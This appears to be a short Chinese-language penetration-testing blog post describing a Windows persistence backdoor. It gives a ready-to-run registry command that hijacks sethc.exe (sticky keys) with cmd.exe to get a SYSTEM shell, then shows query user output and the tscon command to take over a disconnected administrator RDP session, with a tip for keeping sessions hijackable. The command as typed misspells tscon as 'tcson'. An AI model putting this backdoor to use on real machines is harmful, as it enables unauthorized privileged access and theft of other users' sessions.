---
title: "Mstsc tscon 后门"
date: 2018-07-11T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['persistence']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

**System 权限**

`nt authority\system`

shift 注册表劫持.

<!--more-->

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

`query user` 查看 ID.

```
USERNAME        SESSIONNAME     ID  STATE  IDLE TIME   LOGON TIME
administrator   rdp-tcp#1        1  Disc       none    6/30/2018 10:00
```

输入命令 `tcson 1`

*注意关闭远程桌面的时候不要点注销, 而是直接点右上角的X, 这样下次连接的时候还能进行切换.*